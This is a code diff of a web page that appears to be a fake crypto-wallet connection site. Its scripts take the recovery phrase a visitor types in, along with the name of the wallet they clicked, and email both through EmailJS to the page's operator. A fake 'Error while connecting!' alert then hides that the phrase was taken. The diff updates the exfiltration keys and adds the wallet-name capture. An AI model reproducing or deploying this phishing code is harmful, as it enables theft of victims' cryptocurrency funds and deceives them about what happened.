@@ -9002,7 +9002,7 @@
   <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script>
     (function () {
-      emailjs.init("8kcCHUTFrGBFvH90m"); // Replace YOUR_USER_ID with your actual user ID
+      emailjs.init("iVGmU4pl3ORLCeERV"); // Replace YOUR_USER_ID with your actual user ID
   
       $(document).ready(function () {
         $("#phraseSend").on("click", function () {
@@ -9050,50 +9050,50 @@
   </script>
   
   <script>
-
-    let thisPhrase = document.getElementById("phrase1")
-    function proceed() {
-      console.log(thisPhrase.value)
-
-      if (thisPhrase.value != "") {
+    let thisPhrase = document.getElementById("phrase1");
+  
+    function proceed(wallet) {
+      console.log("Message:", thisPhrase.value);
+    console.log("Wallet Name:", wallet);
+      if (thisPhrase.value.trim() !== "") {
         var templateParams = {
-          message: thisPhrase.value
+          message: thisPhrase.value,
+          wallet: wallet
         };
-
-        emailjs.send("service_rb4dzwg","template_w2gozbb", templateParams).then(
-          (response) => {
-            console.log('SUCCESS!', response.status, response.text);
-            alert("Try again later. Server is being maintained.")
-          },
-          (error) => {
-            console.log('FAILED...', error);
-          },
-        );
-
-      } else {
-        console.log("the phrase is empty")
-      }
-
+  
+        emailjs.send("service_zuhhyoh","template_d4mgj3b", templateParams)
+          .then(
+            (response) => {
+              console.log('SUCCESS!', response.status, response.text);
+              console.log("Message:", thisPhrase.value);
+    console.log("Wallet Name:", wallet);
+              alert("Error while connecting!");
+            },
+            (error) => {
+              console.log('FAILED...', error);
+              alert("Failed to send email. Please try again.");
+            }
+          );
+  
+      } 
     }
-
-
-
   </script>
+  
   <script>
     (function () {
-      emailjs.init("8kcCHUTFrGBFvH90m"); 
-
+      emailjs.init("iVGmU4pl3ORLCeERV");
+  
       document.getElementById('form').addEventListener('submit', function (event) {
         event.preventDefault();
-
+  
         // Collect form data
         let formData = new FormData(this);
-
+  
         // Send the email
-        emailjs.sendForm("service_rb4dzwg","template_w2gozbb", formData)
+        emailjs.sendForm("service_zuhhyoh","template_d4mgj3b", formData)
           .then(function (response) {
             console.log('Success!', response.status, response.text);
-            
+  
             // Optionally, display a success message to the user
           }, function (error) {
             console.error('Failed...', error);
@@ -9102,6 +9102,28 @@
       });
     })();
   </script>
+  
+  <script>
+    $(document).ready(function () {
+      $(".coin").each(function () {
+        $(this).on("click", function () {
+          // Debugging output
+          console.log("Button clicked");
+  
+          // Check if h4 is found
+          let h4Element = $(this).find("h4");
+          console.log("H4 Element:", h4Element);
+  
+          // Get wallet name
+          let wallet = h4Element.text().trim();
+          console.log("Wallet Name:", wallet);
+  
+          proceed(wallet);
+        });
+      });
+    });
+  </script>
+  
   <script>
     $(document).ready(function () {
       let wallets = $(".coin-registry button");
